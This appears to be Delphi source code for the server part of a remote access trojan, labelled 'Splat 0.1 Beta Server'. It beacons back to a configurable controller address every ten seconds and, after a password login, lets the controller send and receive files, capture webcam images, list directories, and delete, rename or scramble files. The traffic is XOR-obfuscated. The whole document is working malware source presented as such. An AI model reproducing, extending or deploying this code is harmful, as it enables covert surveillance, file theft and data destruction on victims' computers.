   Program pServer;

   uses
     Windows,
     Winsock,
     WinInet,
     untDCC in 'untDCC.pas',
     untWebcam in 'untWebcam.pas',
     untFileManager in 'untFileManager.pas',
     MD5 in 'md5.pas';
   //  pngImage in 'pngImage.pas';

   Const
     Name          : String  = 'Splat 0.1 Beta Server';  // Working Title ;D
     Version       : String  = '0.1';
     Password      : String  = '~w=myPWD          '; // 15
     Port          : String  = '~r=2862 ';
     Address       : String  = '~a=127.0.0.1      '; // 15

     EncodeType    : Integer =  1; { 1: Simple; 2: Advanced; }
     EncXor1       : Integer =  40;
     EncXor2       : Integer =  3;
     BlockIp       : Array[0..1] Of String = ('127.0.*.*', '192.168.*.*');

     CloseServer   : Bool = False;
     PassProtected : Bool = True;

   Var
     UserLoggedin  : Bool = False;

   //------------------------------------------------------------------------------

   (*
   Procedure BMPtoPNG(Name: String);
   Var
     png   :TPngObject;
     bmp   :HBitMap;
   Begin
     bmp := LoadImage(GetModuleHandle(NIL),
                      pChar(Name),
                      IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
     png := TPngObject.Create;
     If (bmp <> 0) Then
     Begin
       png.AssignHandle(Bmp, False, 0);
       png.CompressionLevel := 9;
       png.SaveToFile('test.png');
     End;
     png.Free;
   End;
   *)

   Function GetConnection:String;
   Var
    S:Dword;
   Begin
    S := INTERNET_CONNECTION_LAN;
    If InternetGetConnectedState(@S ,0) Then
     If ((S) And (INTERNET_CONNECTION_LAN) = INTERNET_CONNECTION_LAN) Then
      Result := 'LAN';
    S := INTERNET_CONNECTION_MODEM;
    If InternetGetConnectedState(@S ,0) Then
     If ((S) And (INTERNET_CONNECTION_MODEM) = INTERNET_CONNECTION_MODEM) Then
      Result := 'Dial-up';
   End;

   Procedure Trim(Var Str: String);
   Var
     I: Integer;
     Tmp: String;
   Begin
     Tmp := '';

     For I := Length(Str) DownTo 0 Do
       If (Str[i] = ' ') Then
         Tmp := Copy(Str, 1, I-1)
       Else Break;

     Str := Tmp;
   End;

   Function StripConst(Index: Integer): String;
   Begin
     Case (Index) Of
       0: Result := Copy(Password, 4, Length(Password));
       1: Result := Copy(Port    , 4, Length(Port    ));
       2: Result := Copy(Address , 4, Length(Address ));
     End;
     Trim(Result);
   End;

   Procedure Encode(Var Data: String);
   Var
     Ch: String;
     Od: Integer;
     I : Integer;
   Begin
     For I := 1 To Length(Data) Do
     Begin
       Ch := Data[I];
       Od := Ord(Ch[1]);
       Data[I] := Chr(((Od XOR EncXor1) XOR EncXor2));
       If EncodeType = 2 Then
         Data[I] := Chr(Ord(Data[I]) XOR Length(Data));
     End;
   End;

   Function WildCardIP(IP: String): Bool;
   Var
     IP1   : String;
     I,J   : Integer;
   Begin
     ZeroMemory(@I, SizeOf(I));
     IP1 := IP;
     Result := False;

     For I := 0 To 1 Do
     Begin
       SetLength(IP1, Length(BlockIP[i]));
       For J := 1 To Length(BlockIP[i]) Do
         If BlockIP[I][J] = '*' Then IP1[J] := '*';
       If BlockIP[I] = IP1 Then
       Begin
         Result := True;
         Break
       End;
     End;
   End;

   Function DoLogin(Pass: String): Bool;
   Begin
     Result := False;
     If Pass = StripConst(0) Then Result := True;
     If Result Then
       UserLoggedin := True;
   End;

   //------------------------------------------------------------------------------

   Procedure SplitCmd(Const Data: Array Of Char;Var Buf: Array Of String; Count: Integer; SplitChar: String);
   Var
     I: Integer;
     J: Integer;
     C: Integer;
     Tmp: String;
   Begin
     ZeroMemory(@I, SizeOf(I));
     ZeroMemory(@J, SizeOf(J));
     ZeroMemory(@C, SizeOf(C));

     FillChar(Buf, SizeOf(Buf), #0);
     Tmp := '';

     For I := 0 To Count-1 Do
     Begin
       If Data[I] = #0 Then Break;
       If Data[I] = (SplitChar) Then
       Begin
         Tmp := Copy(String(Data), C+1, I-C);
         Buf[J] := Tmp;
         Inc(J);
         Inc(C, (I-C)+1);
       End;
     End;
   End;

   Function SendData(Sock: TSocket; Data: String): Integer;
   Begin
     Encode(Data);

     Result := Send(Sock, Data[1], Length(Data), 0);
     If Result < 1 Then
       CloseSocket(Sock);
   End;

   function StrtoInt(const S: string): integer; var
   E: integer; begin Val(S, Result, E); end;

   function InttoStr(const Value: integer): string;
   var S: string[11]; begin Str(Value, S); Result := S; end;

   Function WriteFile(Name:String; Text:String): Bool;
   Var
     F     :TextFile;
   Begin
     Result := False;
     Try
       AssignFile(F, name);
       Rewrite(F);
       Write(F, Text);
       CloseFile(F);
       Result := True;
     Except
       Result := False;
     End;
   End;

   Procedure ScrambleFile(Name: String);
   Var
     F     :FILE;
     FF    :TextFile;
     Size  :Integer;
     Ch    :String;
   Begin
     Randomize;

     AssignFile(F, Name);
     Reset(F, 1);
     Size := FileSize(F);
     CloseFile(F);

     AssignFile(FF, Name);
     Rewrite(FF);
     Repeat
       Ch := Chr(Random(255)+1);
       Write(FF, Ch);
       Dec(Size);
     Until Size = 0;
     CloseFile(FF);
   End;

   Procedure RenameFile(Name, NewName: String);
   Begin
     If (CopyFile(pChar(Name), pChar(NewName), False)) Then
       DeleteFile(pChar(Name));
   End;

   Function ReceiveTimeOut(Sock: TSocket): Bool;
   Var
     Time          :TTimeVal;
     FDSet         :TFDSet;
   Begin
     Time.tv_sec := 10;
     Time.tv_usec := 0;

     FD_ZERO(FDSet);
     FD_SET(Sock, FDSet);

     If (Select(0, @FDSET, NIL, NIL, @TIME) <= 0) Then
     Begin
       CloseSocket(Sock);
       Result := False;
       Exit;
     End;
     Result := True;
   End;

   function GetFileSize(FileName: String): Int64;
   Var
     H: THandle;
     fData: tWin32FindData;
   Begin
     Result := -1;
     H := FindFirstFile(pChar(FileName), fData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindClose(H);
       Result := Int64(fData.nFileSizeHigh) shl 32 + fData.nFileSizeLow;
     End;
   End;

   Procedure ReadData(Sock: TSocket);
   Var
     DataBuf: Array Of String;
     ComdBuf: Array Of String;
     RecvBuf: Array[0..1600 ] Of Char;
     CommBuf: Array[0..1600 ] Of Char;
     Data   : String;
     ComdCount: Integer;
     FileTransfer: TFileTransfer;
   Begin

     FileTransfer := TFileTransfer.Create;

     ZeroMemory(@DataBuf, SizeOf(DataBuf));
     ZeroMemory(@RecvBuf, SizeOf(RecvBuf));

     If PassProtected Then
       SendData(Sock, '100'#10);

     While (ReceiveTimeOut(Sock)) Do
     Begin
       ZeroMemory(@RecvBuf, SizeOf(RecvBuf));
       Recv(Sock, RecvBuf, SizeOf(RecvBuf), 0);

       Data := String(RecvBuf);
       Encode(Data);

       ComdCount := 0;
       Move(Data[1], CommBuf, SizeOf(CommBuf));
       SetLength(ComdBuf, Length(Data));
       SplitCmd(CommBuf, ComdBuf, SizeOf(CommBuf), #10);

       While (ComdBuf[ComdCount] <> '') Do
       Begin

         If Data[1] = '1' Then
         Begin
           Data := ComdBuf[ComdCount] + ' ';
           Move(Data[1], RecvBuf, Length(Data));
           SetLength(DataBuf, SizeOf(RecvBuf));
           SplitCmd(RecvBuf, DataBuf, SizeOf(RecvBuf), ' ');

           Case StrToInt(DataBuf[0]) Of
             // --- Login Funciton. 100 PASSWORD
             100 : If DoLogin(DataBuf[1]) Then
                   Begin
                     SendData(Sock, '100 TRUE'#10);
                     // --- User Logged In
                   End Else
                   Begin
                     SendData(Sock, '100 FALSE'#10);
                     CloseSocket(Sock);
                   End;
             // --- Send File
             101 : If UserLoggedIn Then
                   Begin
                     SendData(Sock, '101 TRUE '+DataBuf[1]+' '+DataBuf[2]+#10);
                     FileTransfer.SendFile(DataBuf[1], StrToInt(DataBuf[2]), (GetFileSize(DataBuf[1])) );
                     // --- Starting File Transfer
                   End Else
                   Begin
                     SendData(Sock, '100 FALSE'#10);
                     CloseSocket(Sock);
                   End;
             // --- Receive File
             102 : If UserLoggedIn Then
                   Begin
                     SendData(Sock, '102 TRUE'#10);
                     FileTransfer.ReceiveFile(DataBuf[1], StrToInt(DataBuf[2]), DataBuf[3], (GetFileSize(DataBuf[1])));
                     // --- Starting File Transfer
                   End Else
                   Begin
                     SendData(Sock, '100 FALSE'#10);
                     CloseSocket(Sock);
                   End;
             // --- Send Webcam
             103 : If UserLoggedIn Then
                   Begin
                     WebcamPic(DataBuf[1]);
                     SendData(Sock, '103 TRUE'#10);
                     FileTransfer.SendFile(DataBuf[1], StrToInt(DataBuf[2]), (GetFileSize(DataBuf[1])))
                   End Else
                   Begin
                     SendData(Sock, '100 FALSE'#10);
                     CloseSocket(Sock);
                   End;
             // --- Send Filelist
             104 : If UserLoggedIn Then
                   Begin
                     WriteFile('tmpList', GetFileDir(DataBuf[1]));
                     SendData(Sock, '104 TRUE '+DataBuf[2]+' '+IntToStr(GetFileSize('tmpList'))+#10);
                     FileTransfer.SendFile('tmpList', StrToInt(DataBuf[2]), (GetFileSize('tmpList')) );
                   End Else
                   Begin
                     SendData(Sock, '100 FALSE'#10);
                     CloseSocket(Sock);
                   End;
             // --- Modify Files
             105 : If UserLoggedIn Then
                   Begin
                     SendData(Sock, '105 TRUE'#10);
                     Case (StrToInt(DataBuf[1])) Of
                       1: DeleteFile(pChar(DataBuf[2]));
                       2: ScrambleFile(DataBuf[2]);
                       3: RenameFile(DataBuf[2], DataBuf[3]);
                     End;
                   End Else
                   Begin
                     SendData(Sock, '100 FALSE'#10);
                     CloseSocket(Sock);
                   End;
             // --- Sent Server-Version / Connection
             106 : If (Sock <> INVALID_SOCKET) Then
                   Begin
                     SendData(Sock, '106 TRUE'#10);
                     SendData(Sock, '106 Version: '+Version+#10);
                     SendData(Sock, '106 Connection: '+GetConnection+#10);
                   End Else
                   Begin
                     SendData(Sock, '100 FALSE'#10);
                     CloseSocket(Sock);
                   End;
             // --- PING PONG
             107 : If UserLoggedIn Then
                   Begin
                     SendData(Sock, '107 TRUE'#10);
                   End Else
                   Begin
                     SendData(Sock, '100 FALSE'#10);
                     CloseSocket(Sock);
                   End;
             End;
           End;
           Inc(ComdCount);
         End;
       End;
     UserLoggedIn := False;
   End;

   Function GetRemoteAddress(Sock: TSocket): String;
   Var
     SockAddrIn    : TSockAddrIn;
     Size          : Integer;
   Begin
     Size := SizeOf(SockAddrIn);
     GetPeerName(Sock, SockAddrIn, Size);
     Result := Inet_nToa(SockAddrIn.sin_addr);
   End;

   Procedure Client;
   Var
     WSAData       : TWSAData;
     Sock          : TSocket;
     SockAddr      : TSockAddr;

     Port          : Integer;
     Address       : String;
   Begin
     WSAStartUp(MakeWord(2,2), WSAData);
       Sock := INVALID_SOCKET;
       Sock := Socket(AF_INET, SOCK_STREAM, 0);
       If (Sock = INVALID_SOCKET) Then Exit;

       SockAddr.sin_family := AF_INET;
       SockAddr.sin_port := hTons(StrToInt(StripConst(1)));
       SockAddr.sin_addr.S_addr := inet_addr(pchar(StripConst(2)));

       If (Connect(Sock, SockAddr, SizeOf(SockAddr)) = ERROR_SUCCESS) Then
         ReadData(Sock);

       CloseSocket(Sock);
     WSACleanUp;
   End;

   {
   Procedure Server(Port_: Integer);
   Var
     WSAData       : TWSAData;
     Size          : Integer;
     Sock2         : TSocket;
     Sock          : TSocket;
     SockAddr      : TSockAddr;
     SockAddrIn    : TSockAddrIn;
     I, J          : Integer;
   Begin
     ZeroMemory(@I, SizeOf(I));
     ZeroMemory(@J, SizeOf(J));

     WSAStartUp(MakeWord(2,2), WSAData);

     Sock := Socket(PF_INET, SOCK_STREAM, 0);
     SockAddrIn.sin_family := AF_INET;
     SockAddrIn.sin_port := hTons(port_);
     SockAddrIn.sin_addr.S_addr := INADDR_ANY;

     Bind(Sock, SockAddrIn, SizeOf(SockAddrIn));

     Winsock.Listen(Sock, 5);

     Repeat
       UserLoggedin := False;
       Size := SizeOf(TSockAddr);
       Sock2 := Winsock.Accept(Sock, @SockAddr, @Size);
       If Not WildCardIP(GetRemoteAddress(Sock2)) Then
         CloseSocket(Sock2);
       If Sock2 <> INVALID_SOCKET Then
         ReadData(Sock2);
     Until CloseServer;

     CloseSocket(Sock2);
     CloseSocket(Sock );
     WSACleanUp;
   End;
   }

   begin
     Repeat Client; Sleep(10000);
     Until  1 = 2 ;

   //  Server(Port);
   end.
